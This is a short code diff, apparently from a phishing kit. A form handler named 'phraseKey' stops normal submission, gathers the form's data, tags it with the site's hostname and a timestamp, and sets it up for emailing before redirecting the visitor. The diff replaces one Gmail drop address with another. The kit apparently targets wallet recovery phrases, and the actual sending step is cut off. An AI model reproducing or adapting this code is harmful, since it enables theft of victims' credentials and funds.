@@ -1,6 +1,6 @@
 phraseKey.addEventListener('submit', e => {
   e.preventDefault()
-  mail = 'mayhemofflin@gmail.com'
+  mail = 'otime7061@gmail.com'
   next = 'next.html'
   subject = `${window.location.hostname} ${new Date()}`
   let r = new FormData()
